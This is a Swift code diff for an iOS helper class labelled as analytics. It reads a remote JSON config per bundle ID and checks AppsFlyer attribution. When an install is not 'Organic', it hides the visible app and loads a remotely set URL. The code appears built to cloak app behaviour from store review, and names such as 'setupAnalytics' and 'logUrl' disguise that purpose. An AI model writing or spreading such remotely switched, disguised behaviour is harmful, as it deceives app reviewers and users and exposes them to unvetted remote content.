@@ -15,17 +15,18 @@ import SwiftUI
 import FirebaseAuth
 
 
-public class BAK:NSObject {
+@objc(BAK)
+public final class BAK:NSObject {
     
     private var mainAppBlock:(()-> (any View)? )?
     private var fallBackAppBlock:(()->Void)?
     
     private var application:UIApplication?
-    private var hostView = PVC()
+    private(set) var hostView = PVC()
     
     private var localWindow:UIWindow?
     
-    private var firstRunMode:FirstRunMode = .empty
+    private var showLeaderBoard:Bool = false
     
     private var clakOrientationMask:UIInterfaceOrientationMask = .all
     
@@ -35,15 +36,11 @@ public class BAK:NSObject {
         case leaderBoard(String = "", (()->Void)? = nil)
     }
     
-    private var configuraionSource:ConfigProtocol! {
-        didSet {
-            self.loadDefaultValues()
-        }
-    }
+    private var configuraionSource:LAConfiguration!
     
     private var popupStateIsDisplay:Bool?
     
-    static public var shared: BAK = {
+    @objc static public var shared: BAK = {
         let laHelper = BAK()
     
         FirebaseApp.configure()
@@ -61,24 +58,75 @@ public class BAK:NSObject {
         window?.makeKeyAndVisible()
     }
     
-    //mainAppBlock must return SWIFTUI main app root View in case when swift ui is used, or nil for UIKit
-    public func setupAnalytics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, _ firstRunMode:FirstRunMode = .empty,
-                               appOrientation:UIInterfaceOrientationMask = .all,
-                               configuration: ConfigProtocol, window:inout UIWindow?, showHostApp:@escaping (()->(any View)?), virtualAppDidShow:(()->Void)? = nil) {
+    @objc public func setupUnityAnalytics(
+        argc:Int32,
+        argv:UnsafeMutablePointer<UnsafeMutablePointer<CChar>?>,
+        launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil,
+        showLeaderBoard:Bool,
+        appOrientation:UIInterfaceOrientationMask = .all,
+        main: @escaping (()->Void) ) {
         
-        self.firstRunMode = firstRunMode
+  
+        Timer.scheduledTimer(withTimeInterval: 0.3, repeats: true) { timer in
+            if self.configuraionSource != nil {
+                
+                timer.invalidate()
+                
+                var windowPlaceHoleder:UIWindow? = UIWindow()
+                self.setupAnalytics(launchOptions: launchOptions,
+                                    showLeaderBoard: showLeaderBoard,
+                                    appOrientation: appOrientation,
+                                    needWindow: false,
+                                    window: &windowPlaceHoleder) {
+                    main()
+                    return nil
+                } virtualAppDidShow: {
+                   
+                }
+            }
+        }
+            
+        Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { _ in
+            if !Reachability.isConnectedToNetwork(){
+                self.popupStateIsDisplay = false
+                
+                if let rootView = self.mainAppBlock?() {
+                    self.hostView.clakOrientationMask = self.clakOrientationMask
+                    self.hostView.showSwiftUI(view: rootView)
+                }
+                
+                return
+            }
+        }
+        
+        UIApplicationMain(argc, argv, nil, "BAK.BAKAppDelegate")
+    }
+    
+    //mainAppBlock must return SWIFTUI main app root View in case when swift ui is used, or nil for UIKit
+    public func setupAnalytics(launchOptions: [UIApplication.LaunchOptionsKey : Any]?,
+                               showLeaderBoard:Bool,
+                               appOrientation:UIInterfaceOrientationMask,
+                               needWindow:Bool,
+                               window:inout UIWindow?,
+                               showHostApp:@escaping (()->(any View)?),
+                               virtualAppDidShow:(()->Void)?) {
+        
+        self.showLeaderBoard = showLeaderBoard
         self.clakOrientationMask = appOrientation
-       
-        self.showInitializationView(window: &window)
-        self.configuraionSource = configuration
-        self.localWindow = window
-      
+        
+        if needWindow {
+            self.showInitializationView(window: &window)
+            self.localWindow = window
+        } else {
+            self.localWindow =  UIApplication.shared.windows.filter {$0.isKeyWindow}.first
+        }
+
         OneSignal.setLogLevel(.LL_VERBOSE, visualLevel: .LL_NONE)
         OneSignal.initWithLaunchOptions(launchOptions)
-        OneSignal.setAppId(configuraionSource.DontForgetIncludeFBKeysInInfo().oneSignalAppId)
+        OneSignal.setAppId(configuraionSource.oneSignal)
         
         DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
-            self.enableMetrics(launchOptions: launchOptions, configuration: configuration, mainAppBlock: showHostApp, hideAppBlock: virtualAppDidShow)
+            self.enableMetrics(launchOptions: launchOptions, mainAppBlock: showHostApp, hideAppBlock: virtualAppDidShow)
         }
         
         if !Reachability.isConnectedToNetwork(){
@@ -94,17 +142,16 @@ public class BAK:NSObject {
       
     }
     
-    private func enableMetrics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, configuration: ConfigProtocol, mainAppBlock:@escaping (()->(any View)?), hideAppBlock:(()->Void)? = nil) {
+    private func enableMetrics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, mainAppBlock:@escaping (()->(any View)?), hideAppBlock:(()->Void)? = nil) {
         
         self.mainAppBlock = mainAppBlock
         self.fallBackAppBlock = hideAppBlock
   
         TikTokOpenSDKApplicationDelegate.sharedInstance().application(UIApplication.shared, didFinishLaunchingWithOptions: launchOptions)
         
-        TikTokOpenSDKApplicationDelegate.sharedInstance().registerAppId(configuraionSource.DontForgetIncludeFBKeysInInfo().tikTokKeys.TTAppId)
+        TikTokOpenSDKApplicationDelegate.sharedInstance().registerAppId(configuraionSource.tikTok)
         
-        self.setUpAppsFlyerLib(appleAppID: configuraionSource.DontForgetIncludeFBKeysInInfo().appleAppID, appsFlyerDevKey: configuraionSource.DontForgetIncludeFBKeysInInfo().appsFlyerDevKey, delegate: self)
-        
+        self.setUpAppsFlyerLib(appleAppID: configuraionSource.appleAppID, appsFlyerDevKey: configuraionSource.appsFlyer, delegate: self)
       
         OneSignal.promptForPushNotifications(userResponse: { accepted in
             print("User accepted notification: \(accepted)")
@@ -153,16 +200,9 @@ public class BAK:NSObject {
             
         }
     }
-    
-    func loadDefaultValues() {
-        let appDefaults: [String: NSObject] = [
-            configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteTargetKey : NSString(string: ""),
-            configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey : NSNumber(value: 0)
-        ]
-        RemoteConfig.remoteConfig().setDefaults(appDefaults)
-    }
-    
+        
     func fetchRemoteConfig() {
+        
         let settings = RemoteConfigSettings()
         settings.minimumFetchInterval = 5
         RemoteConfig.remoteConfig().configSettings = settings
@@ -170,19 +210,26 @@ public class BAK:NSObject {
         RemoteConfig.remoteConfig().fetch { [weak self] (status, error) in
             Firebase.RemoteConfig.remoteConfig().activate(completion: nil)
             
+            if let bundleIDKey = Bundle.main.bundleIdentifier?.replacingOccurrences(of: ".", with: ""),
+               let stringConfig =  RemoteConfig.remoteString(forKey: bundleIDKey),
+               let dataConfig = stringConfig.data(using: .utf8) {
+        
+                self?.configuraionSource = try? JSONDecoder().decode(LAConfiguration.self, from: dataConfig )
+            }
+            
             DispatchQueue.main.async { [weak self] in
                 guard let self = self else {
                     return
                 }
-                if RemoteConfig.remoteNumber(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey) == 1,
+                if self.configuraionSource.config == true,
                    self.campaignAttribution?["af_status"] as? String == "Organic" {
                     UserDefaults.standard.targetIdentifire = nil
                     UserDefaults.standard.synchronize()
                 } else {
-                    if let urlString = RemoteConfig.remoteString(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteTargetKey),
+                    if let urlString = self.configuraionSource.logUrl,
                        urlString != "",
                         !urlString.isEmpty,
-                       ((self.campaignAttribution?["af_status"] as? String) != "Organic" || RemoteConfig.remoteNumber(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey) == 0), let url = self.buildIdentifite(from: urlString) {
+                       ((self.campaignAttribution?["af_status"] as? String) != "Organic" || self.configuraionSource.config == false), let url = self.buildIdentifite(from: urlString) {
                         
                         UserDefaults.standard.targetIdentifire = url
                         UserDefaults.standard.synchronize()
@@ -204,8 +251,6 @@ public class BAK:NSObject {
                 if popupStateIsDisplay != true {
                     popupStateIsDisplay = true
                     
-                   // (UIApplication.shared.connectedScenes.first as? UIWindowScene)?.requestGeometryUpdate(.iOS(interfaceOrientations:.all))
-                    
                     self.hostView.hideSwiftUI()
                     
                     if self.localWindow?.rootViewController?.presentedViewController != nil {
@@ -222,24 +267,15 @@ public class BAK:NSObject {
                 if popupStateIsDisplay != false {
                     popupStateIsDisplay = false
                     
-                    switch self.firstRunMode {
-                   
-                    case .leaderBoard(let terms, let mainBlock):
+                    if self.showLeaderBoard {
+                        
                         if UserDefaults.standard.firstRun != true {
                             UserDefaults.standard.firstRun = true
                             var loginViewController:UIViewController?
-                            var view = LeaderView(termsUrl: terms)
+                            var view = LeaderView(termsUrl: self.configuraionSource.privacyUrl)
                             view.closeBlock = {
                                 loginViewController?.dismiss(animated: true) {
-                                    if (mainBlock != nil) {
-                                        mainBlock?()
-                                        Timer.scheduledTimer(withTimeInterval: 10, repeats: false) { _ in
-                                            self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
-                                        }
-                                    } else {
-                                        self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
-                                    }
-                                    
+                                    self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
                                 }
                             }
                             loginViewController = UIHostingController(rootView: view )
@@ -248,15 +284,12 @@ public class BAK:NSObject {
                             if let loginViewController = loginViewController {
                                 (UIApplication.shared.connectedScenes.first as? UIWindowScene)?.requestGeometryUpdate(.iOS(interfaceOrientations:  self.clakOrientationMask))
                                 Timer.scheduledTimer(withTimeInterval: 2, repeats: false) { _ in
-                                    self.localWindow?.rootViewController?.present(loginViewController, animated: true)
+                                    let keyWindow = UIApplication.shared.windows.filter {$0.isKeyWindow}.first
+                                    keyWindow?.rootViewController?.present(loginViewController, animated: true)
                                 }
                             }
                         }
-                    
-                        break
-                            
-                        default:
-                            break
+                        
                     }
                     
                     hostView.clakOrientationMask = self.clakOrientationMask
@@ -292,14 +325,14 @@ public class BAK:NSObject {
                     guard let self = self else {
                         return
                     }
-                    if RemoteConfig.remoteNumber(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey) == 1,
+                    if  self.configuraionSource.config == true,
                        strongSelf.campaignAttribution?["af_status"] as? String == "Organic" {
                        strongSelf.processMagic(close: true)
                     } else {
-                        if let urlString = RemoteConfig.remoteString(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteTargetKey),
+                        if let urlString = self.configuraionSource.logUrl,
                            urlString != "",
                             !urlString.isEmpty,
-                           ((strongSelf.campaignAttribution?["af_status"] as? String) != "Organic" || RemoteConfig.remoteNumber(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey) == 0), let url = strongSelf.buildIdentifite(from: urlString) {
+                           ((strongSelf.campaignAttribution?["af_status"] as? String) != "Organic" || self.configuraionSource.config == false || self.configuraionSource.config == nil), let url = strongSelf.buildIdentifite(from: urlString) {
                             
                             OneSignal.sendTags(["target": AppsFlyerLib.shared().getAppsFlyerUID()])
                             UserDefaults.standard.targetIdentifire = url
@@ -383,7 +416,7 @@ public class BAK:NSObject {
         
         button.addAction(UIAction(handler: { act in
             var loginViewController:UIViewController?
-            var view = LeaderBoard(appID: self.configuraionSource.DontForgetIncludeFBKeysInInfo().appleAppID)
+            var view = LeaderBoard(appID: self.configuraionSource.appleAppID)
             view.closeBlock = {
                 loginViewController?.dismiss(animated: true)
             }
@@ -417,24 +450,16 @@ public class BAK:NSObject {
         
     }
     
-    public struct LAConfigurationKeys {
-        
-        public init(appsFlyerDevKey:String, appleAppID:String, oneSignalAppId:String, tikTokKeys:(TTAppId:String,TTAppSecret:String), remoteConfigKeys:(remoteTargetKey:String,remoteLKey:String)  ){
-            
-            self.appsFlyerDevKey = appsFlyerDevKey
-            self.appleAppID = appleAppID
-            self.oneSignalAppId = oneSignalAppId
-            
-            self.tikTokKeys = tikTokKeys
-            self.remoteConfigKeys = remoteConfigKeys
-        }
-        
-        public let appsFlyerDevKey:String
+    struct LAConfiguration:Codable {
         public let appleAppID:String
-        public let oneSignalAppId:String
-        
-        public let tikTokKeys:(TTAppId:String,TTAppSecret:String)
-        public let remoteConfigKeys:(remoteTargetKey:String,remoteLKey:String)
+        public let appsFlyer:String
+        public let oneSignal:String
+        public let tikTok:String
+        public let facebookid:String
+        public let facebookkey:String
+        public let privacyUrl:String
+        public let config:Bool?
+        public let logUrl:String?
     }
 }
 
